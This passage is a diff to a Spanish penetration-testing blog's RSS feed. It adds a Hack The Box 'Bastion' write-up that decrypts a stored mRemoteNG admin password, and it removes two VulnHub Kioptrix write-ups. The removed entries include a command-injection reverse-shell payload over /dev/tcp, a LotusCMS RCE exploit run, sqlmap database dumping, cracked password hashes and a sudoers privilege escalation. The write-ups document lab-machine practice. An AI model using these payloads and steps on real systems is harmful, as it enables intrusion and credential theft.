class=&quot;na&quot;&gt;InheritVNCColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCSmartSizeMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCViewOnly=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUsageMethod=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayHostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUseConnectionCredentials=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que tenemos la contraseña del administrador, pero está cifrada con AES.&lt;/p&gt;
+
+&lt;p&gt;Buscando por internet, encontramos un script que crackea la contraseña para el programa mRemoteNG.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py&quot;&gt;https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python mremoteng_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
+Password: thXLHM96BeKL0ER2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Accedemos por ssh como usuario administrador y obtenemos root.txt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Bastion/administrator.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 07 Sep 2019 13:11:34 +0200</pubDate>
+        <link>https://blog.roskyfrosky.com/hackthebox/2019/09/07/Bastion-hackthebox.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/hackthebox/2019/09/07/Bastion-hackthebox.html</guid>
+        
+        <category>hackthebox</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Jerry - Hack The Box</title>
@@ -56,7 +464,7 @@ Para ello generamos la shell mediante el siguiente comando, utilizando msfvenom:
 &lt;p&gt;Y podríamos leer las flags tanto de user como de root.&lt;/p&gt;
 
 </description>
-        <pubDate>Tue, 20 Nov 2018 11:11:34 +0000</pubDate>
+        <pubDate>Tue, 20 Nov 2018 12:11:34 +0100</pubDate>
         <link>https://blog.roskyfrosky.com/hackthebox/2018/11/20/Jerry-hackthebox.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/hackthebox/2018/11/20/Jerry-hackthebox.html</guid>
         
@@ -393,7 +801,7 @@ Flag: Y0u_kn0w_y0u_l0ve_fr1st1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 </description>
-        <pubDate>Thu, 15 Mar 2018 11:11:34 +0000</pubDate>
+        <pubDate>Thu, 15 Mar 2018 12:11:34 +0100</pubDate>
         <link>https://blog.roskyfrosky.com/vulnhub/2018/03/15/Fristileak-vulnhub.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2018/03/15/Fristileak-vulnhub.html</guid>
         
@@ -476,7 +884,7 @@ A continuación, os dejo las slides del taller que impartí, así como las disti
 &lt;/ul&gt;
 
 </description>
-        <pubDate>Mon, 12 Mar 2018 11:11:34 +0000</pubDate>
+        <pubDate>Mon, 12 Mar 2018 12:11:34 +0100</pubDate>
         <link>https://blog.roskyfrosky.com/malware/presentacion/2018/03/12/RootedCon-2018.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/malware/presentacion/2018/03/12/RootedCon-2018.html</guid>
         
@@ -661,7 +1069,7 @@ ejecutamos “sudo -su root” y ponemos la misma contraseña que hemos utilizad
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG{TheFoundMyBackdoorMorty} 10 puntos 130/130 puntos.&lt;/code&gt;&lt;/p&gt;
 </description>
-        <pubDate>Fri, 09 Mar 2018 11:11:34 +0000</pubDate>
+        <pubDate>Fri, 09 Mar 2018 12:11:34 +0100</pubDate>
         <link>https://blog.roskyfrosky.com/vulnhub/2018/03/09/Rickdiculously-vulnhub.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2018/03/09/Rickdiculously-vulnhub.html</guid>
         
@@ -765,7 +1173,7 @@ La primera pista nos indicaba que estaba en los ficheros por lo que con un coman
 &lt;p&gt;Ya hemos conseguido el objetivo de la máquina que era obtener las dos flags y ser usuario root. En la siguiente entrada resolveremos la máquina en el modo hard.&lt;/p&gt;
 
 </description>
-        <pubDate>Tue, 24 Oct 2017 11:11:34 +0100</pubDate>
+        <pubDate>Tue, 24 Oct 2017 12:11:34 +0200</pubDate>
         <link>https://blog.roskyfrosky.com/vulnhub/2017/10/24/VulnerableDocker_Easymode.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/10/24/VulnerableDocker_Easymode.html</guid>
         
@@ -935,7 +1343,7 @@ chmod s+u root_me
 &lt;p&gt;Según el enunciado existen otra flag y una cosa distinta a las otras dos máquinas pero yo no las he buscado, seguramente en otros writeups podáis encontrar la solución para esas dos cosas.&lt;/p&gt;
 
 </description>
-        <pubDate>Fri, 09 Jun 2017 08:11:34 +0100</pubDate>
+        <pubDate>Fri, 09 Jun 2017 09:11:34 +0200</pubDate>
         <link>https://blog.roskyfrosky.com/vulnhub/2017/06/09/Hackfest-orcus.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/06/09/Hackfest-orcus.html</guid>
         
@@ -1001,7 +1409,7 @@ SHA-256:DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753&lt;/p&g
 &lt;p&gt;Esta máquina ha sido bastante sencilla. Veremos si en las otras dos máquina se realizaron durante el CTF del congreso HackFest ofrecen algo más de dificultad.&lt;/p&gt;
 
 </description>
-        <pubDate>Mon, 08 May 2017 08:11:34 +0100</pubDate>
+        <pubDate>Mon, 08 May 2017 09:11:34 +0200</pubDate>
         <link>https://blog.roskyfrosky.com/vulnhub/2017/05/08/Hackfest-quaoar.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/05/08/Hackfest-quaoar.html</guid>
         
@@ -1091,7 +1499,7 @@ Las probamos y podemos acceder.Una vez logueados, mysql te permite la ejecucion 
 &lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/flag.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Mon, 08 May 2017 08:11:34 +0100</pubDate>
+        <pubDate>Mon, 08 May 2017 09:11:34 +0200</pubDate>
         <link>https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html</link>
         <guid isPermaLink="true">https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html</guid>
         
@@ -1101,169 +1509,6 @@ Las probamos y podemos acceder.Una vez logueados, mysql te permite la ejecucion 
         
         
         <category>pentestlimited</category>
-        
-      </item>
-    
-      <item>
-        <title>Kioptrix Level 3 (1.2) VulnHub Boot2Root</title>
-        <description>&lt;h1 id=&quot;kioptrix-level-3-boot2root-vulnhub&quot;&gt;Kioptrix Level 3 Boot2Root Vulnhub&lt;/h1&gt;
-&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-12-3,24/&quot;&gt;https://www.vulnhub.com/entry/kioptrix-level-12-3,24/&lt;/a&gt;&lt;br /&gt;
-&lt;strong&gt;Descripción:&lt;/strong&gt; It’s been a while since the last Kioptrix VM challenge. Life keeps getting the way of these things you know.&lt;/p&gt;
-
-&lt;p&gt;After the seeing the number of downloads for the last two, and the numerous videos showing ways to beat these challenges. I felt that 1.2 (or just level 3) needed to come out. Thank you to all that downloaded and played the first two. And thank you to the ones that took the time to produce video solutions of them. Greatly appreciated.&lt;/p&gt;
-
-&lt;p&gt;As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…&lt;/p&gt;
-
-&lt;p&gt;Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com&lt;/p&gt;
-
-&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
-
-&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que hay un apache corriendo en el puerto 80 y el servicio ssh en el puerto 22. Vamos a empezar mirando por el apache.&lt;br /&gt;
-Introduccimos la dirección IP en el navegador y lo primero que nos encontramos es con una especia de blog.Trás un rato dando vueltas por la página, vemos una frase que nos llama la atención indicandonos que se trata de un CMS.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/cms.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Buscamos un poco por internet y parece ser que hay un exploit para el cms, que permite la ejecución de comandos.
-&lt;a href=&quot;https://github.com/Hood3dRob1n/LotusCMS-Exploit&quot;&gt;https://github.com/Hood3dRob1n/LotusCMS-Exploit&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Descargamos el exploit del github de arriba y lo ejecutamos con el siguiente comando (recordar que hemos apuntado la IP de la máquina a un dominio tal y como indican en la descripción, en este caso, kioptrix3.com)&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash lotusRCE.sh kioptrix3.com /&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Ponemos a escuchar un netcat en nuestra máquina local en el puerto 4444 y rellenamos los datos de la máquina a la que se tiene que conectar y el puerto&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/netcat.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez que podemos ejecutar comando,vemos que hay una carpeta gallery, por lo que entramos en ella mediante la web y trás consultar unos cuantos ficheros a través del navegador nos topamos con mensaje de error de sql.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/sql_error.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ponemos el parámetro que le falta a la url y se ve correctamente como se muestra en la siguiente imagen:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/gallery.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Dado que parece haber un sqlinjection, utilizamos la herramienta sqlmap para que la explotación sea rápida y obtenemos las siguientes bases de datos y las tablas de la que realmente nos interesa, en este caso gallery:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/sqlmap.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En las tablas de gallery,vemos que hay dos tablas que pueden ser interesantes,dev_accounts y gallerific_users  por lo que procedemos a dumpearlas con el siguiente comando:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python sqlmap.py --url http://kioptrix3.com/gallery/gallery.php\?id\=1 --dump --dbs gallery &lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;La tabla de gallerific_users contiene un usuario para loguearnos en la aplicación web, y la tabla dev_accounts contiene dos usuarios como muestra la siguiente imagen:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/users.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a &lt;a href=&quot;https://hashkiller.co.uk/&quot;&gt;https://hashkiller.co.uk/&lt;/a&gt; para comprobar si alguno de los hashes md5 que nos arroja la tabla está crakeado y tenemos suerte:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
-dreg		0d3eccfb887aabd50f243b3f155c0f85 : Mast3r  
-loneferret	5badcaf789d3d1d09794d8f021f40f0e : starwars
-&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Probamos a conectarnos con estos dos usuarios y vemos que tenemos suerte con el usuario loneferret y la contraseña starwars.&lt;/p&gt;
-
-&lt;p&gt;Una vez dentro de la máquina lo primero que hacemos es listar los ficheros del directorio, donde vemos que hay un readme.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/ssh.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Mostramos el fichero del readme&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/readme.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y este nos indica que utilicemos el comando “sudo ht” que es un editor de ficheros. Comprobamos que permisos tiene ese fichero y vemos que tiene el bit suid activado, por lo que al ejecutarse será como root.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/ht_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por lo que vamos a modificar el fichero sudoers para asignar permisos de root al usuario loneferret. Para ello lo que hacemos es añadir el binario /bin/bash para que cuando se ejecute sea con permisos de root.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/ht_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Trás guardar los cambios, comprobamos que comandos de superusuario podemos ejecutar con el usuario loneferret y comprobamos que se ha añadido correctamente /bin/bash, por lo que ejecutamos el comando y comprobamos que efectivamente ahora somos el usuario root.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Thu, 20 Apr 2017 20:11:34 +0100</pubDate>
-        <link>https://blog.roskyfrosky.com/vulnhub/2017/04/20/Kioptrix3.0-vulnhub.html</link>
-        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/04/20/Kioptrix3.0-vulnhub.html</guid>
-        
-        <category>boot2root</category>
-        
-        <category>kioptrix</category>
-        
-        
-        <category>vulnhub</category>
-        
-      </item>
-    
-      <item>
-        <title>Kioptrix Level 2 VulnHub Boot2Root</title>
-        <description>&lt;h1 id=&quot;kioptrix-level-2-boot2root-vulnhub&quot;&gt;Kioptrix Level 2 Boot2Root Vulnhub&lt;/h1&gt;
-&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&quot;&gt;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&lt;/a&gt;&lt;br /&gt;
-&lt;strong&gt;Descripción:&lt;/strong&gt; This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;
-
-&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
-
-&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que hay un apache corriendo en el puerto 80 y en el 443. Vamos a empezar mirando por ahí.
-Introduccimos la dirección IP en el navegador y lo primero que nos encontramos es una pantalla de login.&lt;/p&gt;
-
-&lt;p&gt;Probamos con la tipica usuario:contraseña de admin:admin sin éxito, por lo que vamos a lanzar la inyección sql más típica de todas  por si hubiera suerte&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/login.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y estamos de suerte, nos hemos logueado en la aplicaciṕon y ahora vemos una pantalla donde se pueden introduccir direcciones a las que se pueden realizar pings&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/admin_web.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Introducimos varias IP’s para comprobar que tipo de funcionalidad ofrece esta parte de la aplicación y enseguida caemos en la cuenta de que quizás sea vulnerable a command injection. Vamos a probar a ver si podemos listar los ficheros que se encuentran en el actual directorio.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/command_execution.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y Voilá! Estabamos en lo cierto, es vulnerable a Command Injection!!!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/result_command_execution.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para que nos sea más cómodo trabajar con la máquina, vamos a conectarnos a ella con una reverse shell.En este caso probé a realizarlo mediante netcat como he hecho en otras máquinas pero no me dió buenos resultados, por lo que vamos a pentestmonkey para buscar una reverse shell en bash, la cuál podemos encontrar aquí &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos ponemos con netcat a escuchar en nuestra máquina conexiones entrantes&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 8080&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Y modificamos la línea de comando cambiando la ip y el puerto por los nuestros, de manera que el siguiente comando es el que tenemos que introduccir en la casilla de ping:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;localhost; bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.37/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/reverse_shell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como se puede ver en la imagen anterior, se ha realizado la conexión y lo primero que hemos hecho es comprobar que usuario somos, en este caso apache.
-Lo siguiente que hemos realizado es que versión de kernel tiene la máquina para buscar si existe algún exploit público.
-El kernel de la máquina es Linux 2.6.9-55.
-Por lo que buscamos un exploit que sea para ese kernel y esa versión el cuál podemos encontrar aquí: &lt;a href=&quot;https://www.exploit-db.com/exploits/9542/&quot;&gt;https://www.exploit-db.com/exploits/9542/&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Lo descargamos, compilamos y ejecutamos y conseguimos root en la máquina.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Sat, 01 Apr 2017 20:11:34 +0100</pubDate>
-        <link>https://blog.roskyfrosky.com/vulnhub/2017/04/01/Kioptrix2.0-vulnhub.html</link>
-        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/04/01/Kioptrix2.0-vulnhub.html</guid>
-        
-        <category>boot2root</category>
-        
-        <category>kioptrix</category>
-        
-        
-        <category>vulnhub</category>
         
       </item>
     
